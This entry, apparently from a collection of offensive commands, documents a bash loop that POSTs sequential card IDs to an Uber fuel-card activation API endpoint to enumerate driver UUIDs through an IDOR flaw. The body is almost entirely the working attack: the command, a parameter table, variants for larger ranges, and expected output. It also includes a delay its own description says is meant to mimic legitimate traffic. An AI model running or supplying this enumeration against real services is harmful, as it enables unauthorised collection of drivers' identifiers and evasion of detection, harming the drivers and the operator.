---
data: >-
  for i in {1..1000}; do response=$(curl -s -X POST
  'https://api.uber.com/v1/fuelcards/activate' -H 'Authorization: Bearer
  YOUR_ACCESS_TOKEN' -H 'Content-Type: application/json' -d "{\"card_id\":
  $i}"); uuid=$(echo $response | jq -r '.driver_uuid // empty'); if [ ! -z
  "$uuid" ]; then echo $uuid >> driver_uuids.txt; fi; sleep 0.1; done
tags:
  - api
  - enumerate
  - idor
  - bash
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:29.892Z'
id: c5a172a3-4bcb-440e-9ee1-c45415d20ee4
verified: false
validated: true
submitted: true
---
# curl-activatefuelcard-enumerate

## Command

```bash
for i in {1..1000}; do
  response=$(curl -s -X POST 'https://api.uber.com/v1/fuelcards/activate' \
    -H 'Authorization: Bearer YOUR_ACCESS_TOKEN' \
    -H 'Content-Type: application/json' \
    -d "{\"card_id\": $i}")
  uuid=$(echo $response | jq -r '.driver_uuid // empty')
  if [ ! -z "$uuid" ]; then
    echo $uuid >> driver_uuids.txt
  fi
  sleep 0.1
done
```

## Description

This bash loop automates enumeration of driver UUIDs via the Uber activateFuelCard endpoint by iterating sequential card IDs, extracting UUIDs from responses, and logging valid ones to a file while including a delay to mimic legitimate traffic.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `{1..1000}` | Range of card IDs to test | Yes (adjust as needed) |
| `curl ...` | Inner HTTP request for each ID | Yes |
| `jq -r '.driver_uuid // empty'` | Extracts UUID or empty string | Yes (requires jq) |
| `>> driver_uuids.txt` | Appends to output file | Yes |
| `sleep 0.1` | Delay between requests | Recommended |

## Examples

### Basic Usage

```bash
for i in {1..100}; do ... done  # Smaller range for testing
```

### Advanced Usage

```bash
for i in {1..5000}; do ...; if [[ $((i % 100)) -eq 0 ]]; then echo "Progress: $i"; fi; done  # With progress logging
```

## Expected Output

No direct stdout; generates driver_uuids.txt with lines like "abc123-def456". Use wc -l driver_uuids.txt to count collected UUIDs.

## Related

- [[Related Procedure]]
